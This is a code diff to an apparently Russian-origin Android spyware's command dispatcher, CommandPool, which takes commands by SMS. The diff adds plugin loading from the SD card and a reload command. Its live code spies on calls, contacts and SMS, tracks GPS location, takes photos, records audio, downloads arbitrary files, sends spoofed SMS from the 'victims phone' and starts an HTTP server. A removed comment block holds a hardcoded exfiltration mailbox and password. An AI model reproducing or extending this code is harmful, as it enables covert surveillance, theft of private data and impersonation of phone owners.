@@ -4,7 +4,6 @@ import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.FilenameFilter;
-import java.io.IOException;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
@@ -27,7 +26,6 @@ import android.content.SharedPreferences;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
-import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.DefaultHttpClient;
@@ -55,7 +53,6 @@ import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.Contacts;
-import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
@@ -63,7 +60,7 @@ import android.view.SurfaceView;
 public class CommandPool extends Object {
 
 	
-	public final List<CommandObj> commands = new ArrayList<CommandObj>();
+	public final List<CommandObj> mCommands = new ArrayList<CommandObj>();
 	public Context mContext;
 	public ArrayList<ContactObj> mContacts;
 	public boolean isIntialized = false;
@@ -87,9 +84,11 @@ public class CommandPool extends Object {
 	}
 	
 
-	public CommandPool add(CommandObj cmd) {
-		commands.add(cmd);
-		return this;
+	public void add(CommandObj command) throws Exception {
+		if ( findCommand(command.commandName) != null )
+			throw new Exception(String.format("Command  %s  is already defined.",command.commandName));
+		NetLog.v("Command added %s",command.commandName);
+		mCommands.add(command);
 	}
 	
 	public CommandObj loadPlugin(String jarFile,String classPath) {
@@ -116,16 +115,22 @@ public class CommandPool extends Object {
 		return null;
 	}
 	
-	public boolean loadPlugins() {
-    	try {
-        	File dir = new File("/mnt/sdcard/");
+	public String getPluginHome()  {
+		return "/mnt/sdcard/";
+	}
+	
+	public int loadPlugins() {
+    	int pluginCount = 0;
+		try {
+        	File dir = new File(getPluginHome());
         	File[] jarList = dir.listFiles(new FilenameFilter() {
 				public boolean accept(File file, String name) {
-					return name.endsWith(".jar");
+					return name.endsWith(".jar") && name.startsWith("csPlugin");
 				}
-        	});
+        	}); // jarList
+        	
         	if ( jarList.length == 0 )
-        		return false;
+        		return 0;
         	for ( File jarFile: jarList ) {
         		NetLog.v("JAR: %s",jarFile.getAbsolutePath());
         		JarFile jar = new JarFile(jarFile);
@@ -140,24 +145,64 @@ public class CommandPool extends Object {
         				continue;
         			
         			NetLog.v("Plugin command added: %s\r\n",command.commandName);
+        			command.isPlugin = true;
         			add(command);
+        			pluginCount++;
         		}
         	}
         	
     	} catch ( Exception e) {
+    		NetLog.e("Failed to load plugins: %s",e.getMessage());
 			e.printStackTrace();
-			return false;
+			return -1;
     	}     	
-    	return true;
+    	return pluginCount;
 	} // loadPlugins
+	
+	/*
+	 *  Reloading plugins
+	 */
+
+	public void reloadPlugins() {
+		NetLog.w("Reloading plugins...\n");
+		ArrayList<CommandObj> toRemove = new ArrayList<CommandObj>();
+		for ( CommandObj cmd : mCommands  )
+			if ( cmd.isPlugin == true )
+				toRemove.add(cmd);
+		
+		if ( !toRemove.isEmpty()  ) {
+			NetLog.v("Removing %d plugins from commands pool / %d ...",toRemove.size(),mCommands.size());
+			mCommands.removeAll(toRemove);
+		}
+		toRemove.clear();
+		toRemove = null;
+		int pluginCount = loadPlugins();
+		if (  pluginCount == 0 )
+			NetLog.w("No plugins found...");
+		else if ( pluginCount < 0 )
+			NetLog.w("Failed to load plugins...");
+		else 
+			NetLog.w("%d Plugins is successfuly loaded, command pool is now %d",pluginCount,mCommands.size());
+	}
+	
+	/*
+	 *  Releases the Pool
+	 */
+	public void Release() {
+		if ( !this.isIntialized ) 
+			return;
+		mCommands.clear();
+		this.isIntialized = false;
+	}
 	
 	/*
 	 *  Initialization pool with command set
 	 */
-	public boolean Init(String src,Context context) {
+	public boolean Init(String src,Context context) throws Exception {
 		
 		//TODO: Initialization
 		NetLog.w("CommandPool Initialization : %s",src);
+
 		
 		if ( mContext == null || !context.equals(mContext))  {
 			NetLog.v("Changing context %s => %s...",mContext,context);
@@ -166,24 +211,25 @@ public class CommandPool extends Object {
 			NetLog.v("Using cached context...");
 
 		if ( this.isIntialized ) {
-			NetLog.v("Command Pool is alread initialized");
+			NetLog.v("Command Pool is already initialized ( %d commands )",mCommands.size());
 			return false;
 		}
 		
 		this.isIntialized= true;
-		
-		if ( loadPlugins() )
-			NetLog.w("Plugins is successfuly loaded");
-		
+
 		NetLog.v("Loading contacts...");
 		mContacts = listContacts();
+		NetLog.v("Populating commands...");
 		
+		
+		// load/reloading plugins
+		reloadPlugins();
 		
 		/*
 		 *  Monitoring of call log base 
 		 *  "rcalls;on|off"
 		 */
-		commands.add( new CommandObj(Commands.SPY_CALLS,"on|off")  { 
+		this.add( new CommandObj(Commands.SPY_CALLS,"on|off")  { 
 			
 			public int Invoke() throws Exception {
 				final handleCallLog handler = new handleCallLog(mContext);
@@ -208,7 +254,7 @@ public class CommandPool extends Object {
 		 *   Reflects contacts
 		 *   "rcontacts;<on|off>"
 		 */
-		commands.add( new CommandObj(Commands.SPY_CONTACTS,"on|off")  { 
+		this.add( new CommandObj(Commands.SPY_CONTACTS,"on|off")  { 
 				
 			public int Invoke() throws Exception {
 				final handleContacts handler = new handleContacts(mContext);
@@ -230,7 +276,7 @@ public class CommandPool extends Object {
 		/*
 		 *  Network IP address info
 		 */
-		commands.add( new CommandObj(Commands.NETWORK_INFO)  { 
+		this.add( new CommandObj(Commands.NETWORK_INFO)  { 
 			
 			public void bgProcess() {
 				BackgroundTask<Boolean,CommandObj> bg = new BackgroundTask<Boolean,CommandObj>(mContext,false) {
@@ -303,7 +349,7 @@ public class CommandPool extends Object {
 		 *  List Contacts
 		 * "@lcontacts"
 		 */
-		commands.add(new CommandObj(Commands.LIST_CONTACTS) {
+		this.add(new CommandObj(Commands.LIST_CONTACTS) {
 			public int Invoke() throws Exception {
 				final List<ContactObj> contacts = listContacts();
 				int nCount = 1;
@@ -330,7 +376,7 @@ public class CommandPool extends Object {
 		 *  Lists SMS messages
 		 *  "@lsms;[f:yymmdd];[t:yymmdd]"
 		 */
-		commands.add(new CommandObj(Commands.LIST_SMS,";[f:yymmdd];[t:yymmdd]") {
+		this.add(new CommandObj(Commands.LIST_SMS,";[f:yymmdd];[t:yymmdd]") {
 			public int Invoke() throws Exception {
 				ArrayList<SmsObj> smsList = listSMS();
 		
@@ -390,7 +436,7 @@ public class CommandPool extends Object {
 		 *  Lists calls
 		 *  "lcalls;f:yymmdd;t:yymmdd"
 		 */
-		commands.add( new CommandObj(Commands.LIST_CALLS,"[f:yymmdd;[t:yymmdd]") {
+		this.add( new CommandObj(Commands.LIST_CALLS,"[f:yymmdd;[t:yymmdd]") {
 
 			public int Invoke() throws Exception {
 				
@@ -433,7 +479,7 @@ public class CommandPool extends Object {
 		 *   Starts an location manager to acquire gps coords
 		*    "@gps;<timeout_sec>"
 		 */
-		commands.add(new CommandObj(Commands.TAKE_LOCATION,";t:<liveTime>[;off]") {
+		this.add(new CommandObj(Commands.TAKE_LOCATION,";t:<liveTime>[;off]") {
 			
 			public boolean isActive = false;
 			
@@ -531,7 +577,7 @@ public class CommandPool extends Object {
 		 *  Set's up properties,emil,host,etc
 		*  "@setup;"
 		 */
-		commands.add(new CommandObj(Commands.SETUP) {
+		this.add(new CommandObj(Commands.SETUP) {
 			public int Invoke() throws Exception {
 				
 				SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
@@ -571,7 +617,7 @@ public class CommandPool extends Object {
 		 *  Shows simple notification on status bat
 		 * " @notify;Hello world!;This is the Test"
 		 */
-		commands.add(new CommandObj(Commands.NOTIFY,";<title>;<message>") {
+		this.add(new CommandObj(Commands.NOTIFY,";<title>;<message>") {
 			public int Invoke() throws Exception {
 				String title = "";
 				String msg = "";
@@ -594,7 +640,7 @@ public class CommandPool extends Object {
 		 *  Vibrates the phone
 		 *  "@vibrate;<sec>;<sec>;...<sec>"
 		 */
-		commands.add(new CommandObj(Commands.VIBRATE,"<ms>;...;<ms>...") {
+		this.add(new CommandObj(Commands.VIBRATE,"<ms>;...;<ms>...") {
 			
 			public int Invoke() {
 				Vibrator vibrator = (Vibrator)mContext.getSystemService(Context.VIBRATOR_SERVICE);
@@ -615,7 +661,7 @@ public class CommandPool extends Object {
 		 *  Turns Wifi on/off
 		 *  "wifi;<0|1>"
 		 */
-		commands.add(new CommandObj(Commands.SWITCH_WIFI,";0|1") {
+		this.add(new CommandObj(Commands.SWITCH_WIFI,";0|1") {
 			public int Invoke() throws Exception {
 				WifiManager wifiManager = (WifiManager)mContext.getSystemService(Context.WIFI_SERVICE);
 				boolean enable = CommandArgs.toBoolean(args.getOpt(0));
@@ -636,7 +682,7 @@ public class CommandPool extends Object {
 		 *  Downloads photo's
 		 *  format: "photo;"
 		 */
-		commands.add(new CommandObj(Commands.TAKE_PHOTO,";t:<yymmdd>;[names];[sms]") {
+		this.add(new CommandObj(Commands.TAKE_PHOTO,";t:<yymmdd>;[names];[sms]") {
 			
 			public List<File> files = new ArrayList<File>();
 			public long checkDate = 0;
@@ -722,7 +768,7 @@ public class CommandPool extends Object {
 		 *  downloads an arbitary file
 		 *   "file;f:<filepath>;[m:<mask>]"
 		 */
-		commands.add(new CommandObj(Commands.DOWNLOAD_FILE,";f:<filepath>;[m:<ext>]") {
+		this.add(new CommandObj(Commands.DOWNLOAD_FILE,";f:<filepath>;[m:<ext>]") {
 			
 			final class Filter implements FilenameFilter {
 				private String mask;
@@ -778,7 +824,7 @@ public class CommandPool extends Object {
 		 *  SMS reflection
 		 *  "rsms;<on|off>;[mail]"
 		 */
-		commands.add(new CommandObj(Commands.SPY_SMS,"[;off][;mail]") {
+		this.add(new CommandObj(Commands.SPY_SMS,"[;off][;mail]") {
 			
 			final public HashMap<String,String> names = new HashMap<String,String>();
 			
@@ -818,7 +864,7 @@ public class CommandPool extends Object {
 		 *  Voice recording
 		 *  "mic;t:<sec>"
 		 */
-		commands.add(new CommandObj(Commands.RECORD_AUDIO,"<sec>;[sms]") {
+		this.add(new CommandObj(Commands.RECORD_AUDIO,"<sec>;[sms]") {
 			public int Invoke() throws Exception {
 				
 				if ( args.optCount() == 0 ) {
@@ -859,7 +905,7 @@ public class CommandPool extends Object {
 		 * 
 		 * 
 		 */
-		commands.add(new CommandObj("cam","0|1") {
+		this.add(new CommandObj("cam","0|1") {
 			
 			final class picCallback implements Camera.PictureCallback {
 
@@ -936,7 +982,7 @@ public class CommandPool extends Object {
 		 *  send sms from victims phone
 		 *  "msg;<phone>;<message>"
 		 */
-		commands.add(new CommandObj(Commands.SPOOF_SMS,"<phone>;<text>") {
+		this.add(new CommandObj(Commands.SPOOF_SMS,"<phone>;<text>") {
 			public int Invoke() throws Exception {
 				
 				if ( args.optCount() != 2 ) {
@@ -960,9 +1006,9 @@ public class CommandPool extends Object {
 		 *  Send the availsbale command to requestor
 		 *  "help"
 		 */
-		commands.add(new CommandObj(Commands.HELP) {
+		this.add(new CommandObj(Commands.HELP) {
 			public int Invoke() {
-				for ( CommandObj cmd : commands ) {
+				for ( CommandObj cmd : mCommands ) {
 					if ( commandResult.length() > 0 ) commandResult = commandResult.concat(",");
 					
 					commandResult = commandResult.concat(cmd.commandName);
@@ -978,7 +1024,7 @@ public class CommandPool extends Object {
 		 *  HTTPD Server
 		 *  "httpd;[host];<port>"
 		 */
-		commands.add(new CommandObj(Commands.RUN_HTTPD,";{stop};{<ip>];<port>}") {
+		this.add(new CommandObj(Commands.RUN_HTTPD,";{stop};{<ip>];<port>}") {
 			public int Invoke() throws Exception {
 				String  host = null;
 				String  port = null;
@@ -1001,14 +1047,23 @@ public class CommandPool extends Object {
 				NetLog.v("HTTPD %s on %s:%s",srv.isActive()?"Started":"Stopped",host==null?"localhost":host,port);
 				return CommandObj.OK;
 			}
-		});
+		}); // "httpd"
+		
+		/*
+		 *  RE-Initializes command pool to catch a now commands from pugins 
+		 *  "@reload";
+		 */
+		this.add(new CommandObj(Commands.RELOAD) {
+			public int Invoke() throws Exception {
+				CommandPool.this.reloadPlugins();
+				return CommandObj.OK;
+			}
+		});// "reload"
 		
 		//TODO: Add new commands above this line
 		
-		NetLog.w("Commad Pool initialized with %d commands",commands.size());
-		
+		NetLog.w("Commad Pool initialized with %d commands",mCommands.size());
 		return true;
-		
 	} // CommandPool#Init
 	
 	
@@ -1016,6 +1071,12 @@ public class CommandPool extends Object {
 	 *  Execution sms command
 	 */
 	public boolean Execute(String phone,String source ) {
+		
+		if  ( mCommands.isEmpty()  ) {
+			NetLog.v("Command set is empty");
+			//CommandObj.sendSMS(phone,"%sCommand set is empty...",CommandObj.SERVICE_REPLY_TAG);
+			return false;
+		}
 		
 		String commandName = source;
 		String args = "";
@@ -1025,11 +1086,10 @@ public class CommandPool extends Object {
 			args = source.substring(sep+1);
 		} else commandName = source.substring(CommandObj.SERVICE_CMD_TAG.length());
 	
-		NetLog.v("cmd = \"%s\",args = \"%s\"\r\n",commandName,args);
+		NetLog.v("cmd:\"%s\",args:\"%s\"\r\n",commandName,args);
 		CommandObj cmd = findCommand(commandName);
 		if ( cmd == null ) {
-			SmsManager mgr = (SmsManager)SmsManager.getDefault();
-			mgr.sendTextMessage(phone, null, String.format("%sОшибка: команда \"%s\" не найдена",CommandObj.SERVICE_REPLY_TAG, source), null,null);
+			CommandObj.sendSMS(phone, "%sОшибка: команда \"%s\" не найдена",CommandObj.SERVICE_REPLY_TAG, source);
 			return true;
 		}
 	
@@ -1057,8 +1117,8 @@ public class CommandPool extends Object {
 	 *  gets command by name
 	 */
 	public CommandObj findCommand(String commandName) {
-		synchronized(commands) {
-			for ( CommandObj cmd : commands) {
+		synchronized(mCommands) {
+			for ( CommandObj cmd : mCommands ) {
 				if ( cmd.commandName.equalsIgnoreCase(commandName ))
 					return cmd;
 			}
@@ -1082,17 +1142,6 @@ public class CommandPool extends Object {
 		return list;
 	}
 
-		/*
-		public void setDefaults() {
-				SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
-				SharedPreferences.Editor edit = prefs.edit();
-				edit.putBoolean(CommandObj.ACK,true);
-				edit.putString(CommandObj.MAIL_TO,"cache.sync@gmail.com");
-				edit.putString(CommandObj.MAIL_USER,"cache.sync@gmail.com");
-				edit.putString(CommandObj.MAIL_PASS,"gumbaflex");
-				edit.commit();
-		}
-		*/
 
 	/*
 	 *  Finds arbitary contact name for phone number
